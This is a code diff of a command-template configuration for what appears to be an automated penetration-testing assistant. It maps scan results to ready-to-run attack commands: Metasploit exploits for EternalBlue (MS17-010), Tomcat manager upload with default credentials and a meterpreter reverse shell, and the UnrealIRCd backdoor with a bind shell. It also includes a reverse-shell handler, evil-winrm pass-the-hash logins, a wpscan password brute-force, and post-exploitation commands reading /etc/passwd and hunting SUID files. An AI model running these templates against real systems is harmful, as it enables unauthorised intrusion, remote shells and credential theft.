@@ -20,7 +20,6 @@ description: nikto is used to scan a web-server for the vulnerability that can b
 pattern: nikto
 template: nikto -h http://{host}/
 template: nikto -h http://{host}:{port}/
-template: nikto -h {url}
 condition: ["80", "443", "http", "https"]
 group: HTTP
 [end]
@@ -73,7 +72,7 @@ group: Useful Command
 [Echidna]
 description: exploit ms17-010 vulnerability
 template: searchsploit -m 42315.py; python 42315.py {host}
-template: msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts {host}; set lhost {localip}; exploit"
+template: msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set rhosts {host}; set lhost {localip}; exploit"
 condition: ["ms17-010"]
 group: Exploit
 [end]
@@ -87,14 +86,14 @@ group: Exploit
 
 [Echidna]
 description: exploit tomcat service using default credentials
-template: msfconsole -x "use exploit/multi/http/tomcat_mgr_upload; set PAYLOAD java/meterpreter/reverse_tcp; set rhosts {host}; set lhost {localip}; set HTTPUSERNAME tomcat; set HTTPPASSWORD s3cret; set RPORT 8080; exploit"
+template: msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; set PAYLOAD java/meterpreter/reverse_tcp; set rhosts {host}; set lhost {localip}; set HTTPUSERNAME tomcat; set HTTPPASSWORD s3cret; set RPORT 8080; exploit"
 condition: ["tomcat"]
 group: Exploit
 [end]
 
 [Echidna]
 description: exploit UnreaIRCD IRC vulnerability (CVE-2010-2075)
-template: msfconsole -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhosts {host}; set payload cmd/unix/bind_perl;exploit"
+template: msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhosts {host}; set payload cmd/unix/bind_perl;exploit"
 condition: ["UnrealIRCd"]
 group: Exploit
 [end]
@@ -136,7 +135,7 @@ group: Privilege Escalation Command
 
 [Echidna]
 pattern: .*shell session \d opened
-name: read data from the file which is important for privesc
+description: read data from the file which is important for privesc
 template: cat /etc/passwd | grep -v nologin
 template: cat /etc/redhat-release
 template: cat /etc/os-release
@@ -196,7 +195,7 @@ group: Useful Command
 
 [Echidna]
 description: create reverse shell by msfvenom
-template: msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lport 4444; set lhost {localip};"
+template: msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lport 4444; set lhost {localip};"
 group: Useful Command
 [end]
 
@@ -257,7 +256,7 @@ group: HTTP
 
 [Echidna]
 pattern: smb_version
-name: Scan smb version via metasploit module
+description: Scan smb version via metasploit module
 template: msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set rhosts {host}; exploit"
 condition: ["139", "445", "netbios", "microsoft-ds"]
 group: SMB
@@ -265,10 +264,58 @@ group: SMB
 
 [Echidna]
 pattern: evin-winrmi
-name: Scan smb version via metasploit module
+description: Scan smb version via metasploit module
 template: evil-winrm -i {host} -u <UserName> -H <Hash>
 template: evil-winrm -i {host} -u '<UserName>' -p '<Password>'
 condition: ["5985", "5986"]
 group: WinRM
 [end]
 
+[Echidna]
+description: check network service, open port only for local network might be interesting for priv esc
+template: netstat -antup
+condition: ["isInitialShellEstablished"]
+group: Privilege Escalation Command
+[end]
+
+[Echidna]
+description: find out files which have the SUID bit set
+template: find / -perm -u=s -type f 2>/dev/null
+condition: ["isInitialShellEstablished"]
+group: Privilege Escalation Command
+[end]
+
+[Echidna]
+description: enumerate root process
+template: ps aux | grep root
+condition: ["isInitialShellEstablished"]
+group: Privilege Escalation Command
+[end]
+
+[Echidna]
+description: check kernel version which is important for privesc
+template: uname -a
+condition: ["isInitialShellEstablished"]
+group: Privilege Escalation Command
+[end]
+
+[Echidna]
+description: wordpress vulnerability scan by wpscan
+template: wpscan --url http://{host}/  -f cli-no-colour
+template: wpscan --url http://{host}/  -f cli-no-colour -e at -e ap -e u
+template: wpscan --url http://{host}/ -f cli-no-colour -U $username$ -P $passwordfile$ --force
+condition: ["http", "https", "80", "443"]
+group: HTTP
+[end]
+
+[Echidna]
+description: hoge description
+template: hoge
+group: Hoge
+[end]
+
+[Echidna]
+description: hoge2 description
+template: hoge2
+group: Hoge
+[end]
